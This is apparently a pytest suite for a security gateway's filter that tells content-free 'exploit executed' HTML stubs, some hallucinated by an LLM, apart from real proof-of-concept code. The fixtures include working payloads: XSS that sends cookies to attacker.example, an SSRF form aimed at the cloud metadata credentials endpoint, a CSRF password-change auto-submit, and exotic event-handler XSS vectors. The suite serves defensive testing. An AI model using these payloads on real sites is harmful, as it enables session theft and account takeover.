"""PC4 (2026-09-22) regression: a content-free "it worked" stub must never be classified as
`real`/`real_consolidated` Section-1 evidence.

QA report (agent-quan-sát, CVE-2025-30065): `POST /ai/exploit` returned
`section1_tier=real_consolidated` + `reference_code_injected=true`, but Mục 1's actual body was
a static HTML shell — `<!DOCTYPE html>...<h1>CVE-2025-30065 Exploit Executed</h1>...` — with no
exploit logic at all, directly contradicting Mục 3's own "no CVSS / no specific info" admission
for the same CVE.

Root cause: `poc/inject.py::_blocks_for` (and therefore `has_real_code_evidence`/
`enforce_reference_code`/`enforce_section1`) treated ANY non-empty `source_code`/`source_files`
as injectable "real" code — nothing checked whether the bytes contained actual exploit/payload
logic. `poc/consolidate.py`'s own validator only syntax-checks Python or a short interpreter
allow-list (ruby/php/bash/js/perl) and fails OPEN (accepts) for any other language, including
html — exactly the shape the reported stub used.

Fix under test: `poc/inject.py::_is_stub_markup` — a narrow, deterministic, content-based filter
wired into `_blocks_for`. It must reject the exact "narrative shell" shape (markup/text with
ZERO code or payload-delivery markers) while NEVER rejecting a real markup PoC (XSS `<script>`,
CSRF `<form action=…>`, SSRF via `<img src="http://internal/…">`) — those always carry a
delivery/payload marker and must stay classified as real. The suite is function-level (no LLM
calls) so it runs deterministically in CI.
"""
from __future__ import annotations

from secai_gateway.poc.inject import (
    _is_stub_markup,
    _blocks_for,
    enforce_section1,
    has_real_code_evidence,
)

# ── (a) the exact reported stub shape ────────────────────────────────────────────
_STUB_HTML = (
    "<!DOCTYPE html>\n<html>\n<head><title>Exploit</title></head>\n<body>\n"
    "<h1>CVE-2025-30065 Exploit Executed</h1>\n"
    "<p>The vulnerability has been successfully exploited on the target system.</p>\n"
    "</body>\n</html>\n"
)
_STUB_NARRATION_PLAIN = "Exploit executed successfully. The CVE was triggered on the target."


def test_reported_stub_html_is_detected() -> None:
    assert _is_stub_markup(_STUB_HTML, "html") is True


def test_reported_stub_html_detected_even_without_language_tag() -> None:
    # the doctype/html tags alone are enough — a mislabeled/missing `language` field must not
    # let the stub slip through.
    assert _is_stub_markup(_STUB_HTML, "") is True
    assert _is_stub_markup(_STUB_HTML, "python") is True  # wrong tag doesn't rescue it either


def test_plain_narration_stub_without_html_tags_is_detected() -> None:
    assert _is_stub_markup(_STUB_NARRATION_PLAIN, "") is True


def test_empty_code_is_not_flagged_by_this_filter() -> None:
    # emptiness is handled by the existing `if not code` guards elsewhere, not this filter.
    assert _is_stub_markup("", "html") is False
    assert _is_stub_markup("   \n  ", "html") is False


# ── (b) POSITIVE: real PoCs across languages/shapes must NEVER be flagged ───────
_REAL_PYTHON = (
    "import socket\nimport sys\n\n"
    "def exploit(target, port):\n"
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    "    s.connect((target, port))\n"
    "    s.send(b'GET /vuln HTTP/1.1\\r\\n\\r\\n')\n"
    "    print(s.recv(4096))\n\n"
    "if __name__ == '__main__':\n"
    "    exploit(sys.argv[1], int(sys.argv[2]))\n"
)
_REAL_XSS_HTML = (
    "<html>\n<body>\n"
    "<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>\n"
    "</body>\n</html>\n"
)
_REAL_XSS_ALERT = "<script>alert(document.domain)</script>"
_REAL_SSRF_FORM_HTML = (
    "<html><body onload=\"document.forms[0].submit()\">\n"
    "<form action=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" "
    "method=\"GET\">\n<input type=\"submit\" value=\"go\">\n</form>\n"
    "</body></html>\n"
)
_REAL_CSRF_AUTOSUBMIT = (
    "<html><body onload=\"document.getElementById('f').submit()\">\n"
    "<form id=\"f\" action=\"http://victim.example/change_password\" method=\"POST\">\n"
    "<input type=\"hidden\" name=\"new_password\" value=\"pwned123\">\n"
    "</form></body></html>\n"
)


def test_real_python_poc_never_flagged() -> None:
    assert _is_stub_markup(_REAL_PYTHON, "python") is False


def test_real_xss_html_js_poc_never_flagged() -> None:
    assert _is_stub_markup(_REAL_XSS_HTML, "html") is False


def test_real_xss_alert_poc_never_flagged() -> None:
    assert _is_stub_markup(_REAL_XSS_ALERT, "html") is False


def test_real_ssrf_form_poc_never_flagged() -> None:
    assert _is_stub_markup(_REAL_SSRF_FORM_HTML, "html") is False


def test_real_csrf_autosubmit_poc_never_flagged() -> None:
    assert _is_stub_markup(_REAL_CSRF_AUTOSUBMIT, "html") is False


# ── review round 2 (2026-09-22): exotic event-handler XSS vectors ───────────────
# `_STUB_CODE_MARKER_RE` used to hardcode only 6 handler names
# (onerror/onload/onclick/onmouseover/onfocus/onsubmit). Real, common WAF-bypass XSS PoCs use
# uncommon handlers precisely to dodge a narrow filter/WAF — ontoggle/onchange/onpageshow/
# onhashchange/onanimationstart/onpointer*/onwheel/oncontextmenu/… are all legitimate, live
# exploit-db vectors. A markup PoC using ONLY one of these (no <script>/javascript:/fetch(/
# document.cookie/URL-bearing attribute/one of the 6 old handler names) was being misclassified
# as a stub and dropped. Fixed by widening the handler alternative to `\bon[a-z]{2,}=` (any
# `on<word>=` attribute), which still does NOT match the reported CVE-2025-30065 stub (it has no
# event handler / script / URL attribute at all) — see `test_reported_stub_html_is_detected`.
def test_exotic_handler_ontoggle_xss_never_flagged() -> None:
    assert _is_stub_markup("<details open ontoggle=alert(1)>", "html") is False


def test_exotic_handler_onchange_xss_never_flagged() -> None:
    assert _is_stub_markup("<select onchange=alert(1)><option>1</option></select>", "html") is False


def test_exotic_handler_onpageshow_xss_never_flagged() -> None:
    assert _is_stub_markup("<body onpageshow=alert(1)>", "html") is False


def test_exotic_handler_onhashchange_xss_never_flagged() -> None:
    assert _is_stub_markup(
        '<body onhashchange="alert(1)">click me then change hash</body>', "html") is False


def test_reported_stub_still_detected_after_handler_widening() -> None:
    # regression guard for the widened `\bon[a-z]{2,}=` alternative: it must not accidentally
    # start matching plain narrative prose (there is no `on...=` attribute in the stub at all).
    assert _is_stub_markup(_STUB_HTML, "html") is True


# ── review round 3 (2026-09-22): live E2E false-negative — narrative HTML "report" page ────
# CVE-2025-30065 had a REAL Java PoC (exploit-db 88399/88401) plus a companion HTML file the
# LLM had hallucinated: a styled "Parquet Exploitation Scenarios" page with a `<code>curl -X
# POST …</code>` USAGE EXAMPLE in prose and an `<a href="https://fonts.googleapis.com/…">` CDN
# font link. Only that narrative file got rendered as Mục 1 (`section1_tier=real_pruned`) — the
# exact bug class this whole filter exists to catch — because the broad `_STUB_CODE_MARKER_RE`
# matched `curl` and the generic `href=…://` attribute pattern purely from that prose/
# decoration, not from any real exploit logic. Fixed: a FULL html document now requires the
# STRICT `_has_active_html_marker` set (real JS logic / event handler / form action /
# javascript: / non-CDN img|svg|iframe src) — bare `curl`/`wget` mentions and a CDN href no
# longer rescue it. Non-document content (a real bash/shell script) is UNCHANGED — `curl` still
# counts there.
_NARRATIVE_JUNK_HTML = (
    "<!DOCTYPE html>\n<html>\n<head>\n<title>Parquet Exploitation Scenarios</title>\n"
    '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">\n'
    "</head>\n<body>\n"
    '<div class="card">\n'
    "<h2>Scenario 1: Malicious Schema Upload</h2>\n"
    "<p>An attacker could craft a Parquet file with a hostile schema and upload it, for "
    "example:</p>\n"
    '<code>curl -X POST http://target/upload -F "file=@payload.parquet"</code>\n'
    "</div>\n"
    '<a href="https://fonts.googleapis.com/css?family=Roboto">Roboto font</a>\n'
    "</body>\n</html>\n"
)
_REAL_BASH_CURL_POC = (
    "#!/bin/bash\n"
    "TARGET=$1\n"
    'curl -X POST "http://${TARGET}:8080/upload" -F "file=@payload.parquet" '
    '-H "Content-Type: multipart/form-data"\n'
)


def test_narrative_html_report_with_curl_prose_and_cdn_link_is_stub() -> None:
    """(a) the exact live false-negative shape: no <script>/handler/form-action/javascript:/
    non-CDN img-src anywhere — only a curl usage EXAMPLE in prose and a CDN font link."""
    assert _is_stub_markup(_NARRATIVE_JUNK_HTML, "html") is True


def test_real_bash_curl_poc_not_a_document_stays_real() -> None:
    """(b) a REAL curl-based shell PoC (no <html>/doctype wrapper) must still count as real —
    `curl`/`wget` are only excluded from the rescue set for a FULL html document, never for
    plain shell/script content."""
    assert _is_stub_markup(_REAL_BASH_CURL_POC, "bash") is False
    assert _is_stub_markup(_REAL_BASH_CURL_POC, "sh") is False
    assert _is_stub_markup(_REAL_BASH_CURL_POC, "") is False


def test_narrative_junk_pruned_evidence_never_tiers_as_real() -> None:
    """Full-pipeline regression for the live bug: a `pruned=True` entry whose code is the
    narrative junk HTML must not tier as real/real_consolidated/real_pruned."""
    stub_evidence = [{
        "source": "poc_github", "kind": "exploit", "source_ref": "88399",
        "sha256": "9" * 64, "language": "html", "source_code": _NARRATIVE_JUNK_HTML,
        "pruned": True,
    }]
    out, report = enforce_section1(
        _MODEL_REPORT_WITH_MUC3_ADMISSION, stub_evidence,
        cve_known=True, cve_id="CVE-2025-30065")
    assert report["section1_tier"] not in ("real", "real_consolidated", "real_pruned")
    assert "fonts.googleapis.com" not in out
    assert "Parquet Exploitation Scenarios" not in out


# ── positives already covered above (round 1/2) MUST still hold after the R3 strict-html-doc
# branch: real Log4Shell-style Python (test_real_python_poc_never_flagged), XSS onerror/onload
# (test_real_xss_html_js_poc_never_flagged / test_real_ssrf_form_poc_never_flagged /
# test_real_csrf_autosubmit_poc_never_flagged), exotic handlers (ontoggle/onchange/onpageshow/
# onhashchange above), and SSRF img-src-IP (test_html_with_bare_img_ssrf_and_url_is_kept_real
# below) — no new fixtures needed, they already exercise the strict path since all of them are
# full `<html>` documents with a genuine active marker.


# ── (c) edge: HTML with a LITTLE embedded real code must still count as real ────
def test_html_with_minimal_embedded_script_is_kept_real() -> None:
    minimal = (
        "<!DOCTYPE html>\n<html><body>\n<h1>Demo</h1>\n"
        "<script>document.location='http://attacker.example/'+document.cookie</script>\n"
        "</body></html>\n"
    )
    assert _is_stub_markup(minimal, "html") is False


def test_html_with_bare_img_ssrf_and_url_is_kept_real() -> None:
    minimal = '<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>'
    assert _is_stub_markup(minimal, "html") is False


# ── _blocks_for / has_real_code_evidence integration ─────────────────────────────
def test_blocks_for_empty_for_stub_source_code_entry() -> None:
    ev = {"source": "poc_github", "source_code": _STUB_HTML, "language": "html",
          "consolidated": True, "sha256": "s" * 64}
    assert _blocks_for(ev) == ""
    assert has_real_code_evidence([ev]) is False


def test_blocks_for_renders_real_consolidated_entry() -> None:
    ev = {"source": "poc_github", "source_code": _REAL_PYTHON, "language": "python",
          "consolidated": True, "sha256": "s" * 64}
    assert _blocks_for(ev) != ""
    assert has_real_code_evidence([ev]) is True


def test_blocks_for_multifile_all_stub_is_empty() -> None:
    ev = {"source": "poc_github", "sha256": "d" * 64, "source_files": [
        {"path": "index.html", "role": "entry", "language": "html", "code": _STUB_HTML},
        {"path": "note.html", "role": "support", "language": "html",
         "code": "<html><body><p>See above.</p></body></html>"},
    ]}
    assert _blocks_for(ev) == ""
    assert has_real_code_evidence([ev]) is False


def test_blocks_for_multifile_real_entry_kept_even_if_a_companion_is_stub_like() -> None:
    # a companion asset being stub-like must never sink an otherwise real multi-file entry.
    ev = {"source": "poc_github", "sha256": "d" * 64, "source_files": [
        {"path": "exploit.py", "role": "entry", "language": "python", "code": _REAL_PYTHON},
        {"path": "banner.html", "role": "support", "language": "html",
         "code": "<html><body><h1>Info</h1></body></html>"},
    ]}
    assert _blocks_for(ev) != ""
    assert has_real_code_evidence([ev]) is True


# ── full enforce_section1 pipeline: the reported bug shape end-to-end ────────────
_MODEL_REPORT_WITH_MUC3_ADMISSION = (
    "## 2. Cách chạy PoC\n\n- (không áp dụng)\n\n"
    "## 3. Tổng quan Lỗ hổng\n\n"
    "Không có dữ liệu CVSS/mức độ nghiêm trọng trong KB nội bộ cho CVE-2025-30065. "
    "Không có thông tin cụ thể.\n"
)


def test_stub_consolidated_evidence_never_tiers_as_real() -> None:
    """The exact reported shape: a `consolidated=True` entry whose code is the narrative HTML
    shell must NOT produce `section1_tier` in {"real", "real_consolidated", "real_pruned"} —
    it must fall through to a tier consistent with Mục 3's own "no info" admission."""
    stub_evidence = [{
        "source": "poc_github", "kind": "exploit", "source_ref": "foo/bar",
        "sha256": "e" * 64, "language": "html", "source_code": _STUB_HTML,
        "consolidated": True,
    }]
    out, report = enforce_section1(
        _MODEL_REPORT_WITH_MUC3_ADMISSION, stub_evidence,
        cve_known=True, cve_id="CVE-2025-30065")
    assert report["section1_tier"] not in ("real", "real_consolidated", "real_pruned")
    assert report.get("reference_code_injected") is not True
    assert "Exploit Executed" not in out
    assert "<!DOCTYPE html>" not in out


def test_real_consolidated_evidence_still_tiers_as_real_consolidated() -> None:
    """Regression guard: a genuinely real consolidated PoC must be unaffected by the new filter."""
    real_evidence = [{
        "source": "poc_github", "kind": "exploit", "source_ref": "foo/bar/exploit.py",
        "sha256": "f" * 64, "language": "python", "source_code": _REAL_PYTHON,
        "consolidated": True,
    }]
    out, report = enforce_section1(
        "## 2. Cách chạy PoC\n\n- lệnh\n", real_evidence,
        cve_known=True, cve_id="CVE-2025-30065")
    assert report["section1_tier"] == "real_consolidated"
    assert report["reference_code_injected"] is True
    assert "def exploit(target, port)" in out


def test_real_xss_evidence_still_tiers_as_real() -> None:
    """A genuine XSS/HTML PoC (no `consolidated` flag — the plain T1 verbatim path) must still
    inject as `real`, never be mistaken for the stub shape."""
    real_evidence = [{
        "source": "exploitdb", "kind": "exploit", "source_ref": "51234",
        "sha256": "1" * 64, "static_indicators": {"language": "html"},
        "source_code": _REAL_XSS_HTML,
    }]
    out, report = enforce_section1("## 2. Cách chạy PoC\n\n- lệnh\n", real_evidence)
    assert report["section1_tier"] == "real"
    assert report["reference_code_injected"] is True
    assert "fetch('https://attacker.example/steal" in out


# ── review round 4 (2026-09-22): reviewer probe — textbook <script> XSS was misclassified ──
# R3's strict-HTML-doc branch (`_has_active_html_marker`) never checked for a `<script>`
# element at all, so a full-page `<script>alert(document.domain)</script>` / DOM-XSS
# (`innerHTML=location.hash`, `document.write(location.search)`) PoC was flagged as a stub —
# the exact false-negative class this whole filter exists to prevent. Also restored two active
# markers R3 had dropped for the strict branch (`<object data=…>`/`<embed src=…>`/
# `<meta http-equiv="refresh">`) and widened `_HTML_JS_LOGIC_RE` with
# `navigator.sendBeacon(`/dynamic `import(`.
def test_textbook_script_alert_domain_xss_is_real() -> None:
    assert _is_stub_markup(
        "<html><body><script>alert(document.domain)</script></body></html>", "html") is False


def test_script_prompt_xss_is_real() -> None:
    assert _is_stub_markup(
        "<html><body><script>prompt(1)</script></body></html>", "html") is False


def test_dom_xss_innerhtml_location_hash_is_real() -> None:
    assert _is_stub_markup(
        "<html><body><script>document.body.innerHTML=location.hash</script></body></html>",
        "html") is False


def test_dom_xss_document_write_location_search_is_real() -> None:
    assert _is_stub_markup(
        "<html><body><script>document.write(location.search)</script></body></html>",
        "html") is False


def test_object_data_attacker_is_real() -> None:
    assert _is_stub_markup(
        '<html><body><object data="http://attacker.example/x"></object></body></html>',
        "html") is False


def test_embed_src_attacker_is_real() -> None:
    assert _is_stub_markup(
        '<html><body><embed src="http://attacker.example/x"></body></html>', "html") is False


def test_meta_http_equiv_refresh_attacker_is_real() -> None:
    assert _is_stub_markup(
        '<html><head><meta http-equiv="refresh" content="0;url=http://attacker.example">'
        "</head><body></body></html>", "html") is False


def test_script_src_pointing_only_to_cdn_stays_stub() -> None:
    # a decorative <script src="cdnjs..."> (e.g. a chart library on a styled report page) must
    # not by itself rescue an otherwise content-free narrative page.
    assert _is_stub_markup(
        '<html><head><script src="https://cdnjs.cloudflare.com/ajax/libs/x/x.js"></script>'
        "</head><body><h1>Report</h1></body></html>", "html") is True


def test_script_src_pointing_off_cdn_is_real() -> None:
    assert _is_stub_markup(
        '<html><head><script src="http://attacker.example/x.js"></script></head>'
        "<body></body></html>", "html") is False


def test_narrative_parquet_junk_still_stub_after_r4() -> None:
    # regression guard: R4's <script>/object/embed/meta-refresh additions must not accidentally
    # rescue the R3 narrative-junk fixture (it has none of those elements).
    assert _is_stub_markup(_NARRATIVE_JUNK_HTML, "html") is True


def test_reported_stub_still_stub_after_r4() -> None:
    assert _is_stub_markup(_STUB_HTML, "html") is True


def test_two_entry_evidence_junk_pruned_plus_real_java_renders_real() -> None:
    """Reviewer R4 nit: a separate junk `pruned=True` HTML entry alongside its OWN real Java
    entry (two top-level evidence dicts, not one multi-file bundle) — the junk entry must be
    excluded entirely and the real Java code injected with tier `real`."""
    junk_entry = {
        "source": "poc_github", "source_ref": "88401", "sha256": "a" * 64,
        "language": "html", "source_code": _NARRATIVE_JUNK_HTML, "pruned": True,
    }
    real_java_entry = {
        "source": "exploitdb", "source_ref": "88399", "sha256": "b" * 64, "language": "java",
        "source_code": (
            "import java.net.Socket;\n"
            "public class Exploit {\n"
            "    public static void main(String[] args) throws Exception {\n"
            "        Socket s = new Socket(args[0], Integer.parseInt(args[1]));\n"
            "    }\n"
            "}\n"
        ),
    }
    out, report = enforce_section1(
        "## 2. Cách chạy PoC\n\n- lệnh\n", [junk_entry, real_java_entry],
        cve_id="CVE-2025-30065")
    assert report["section1_tier"] == "real"
    assert "fonts.googleapis.com" not in out
    assert "Parquet Exploitation Scenarios" not in out
    assert "class Exploit" in out


def test_multifile_entry_drops_stub_companion_but_keeps_real_file() -> None:
    """Reviewer R4 nit (secondary): a SINGLE entry's `source_files` mixing a real file with a
    stub-shell companion (the live shape: a real Java exploit + the hallucinated narrative HTML
    bundled as siblings) must render ONLY the real file — the junk companion must not appear in
    Mục 1's body, and the real file must never be dropped."""
    ev = {
        "source": "poc_github", "sha256": "c" * 64, "source_files": [
            {"path": "Exploit.java", "role": "entry", "language": "java",
             "code": "import java.net.Socket;\npublic class Exploit { }\n"},
            {"path": "scenarios.html", "role": "support", "language": "html",
             "code": _NARRATIVE_JUNK_HTML},
        ],
    }
    out = _blocks_for(ev, cve_id="CVE-2025-30065")
    assert out != ""
    assert "import java.net.Socket" in out
    assert "fonts.googleapis.com" not in out
    assert "Parquet Exploitation Scenarios" not in out
    assert has_real_code_evidence([ev]) is True
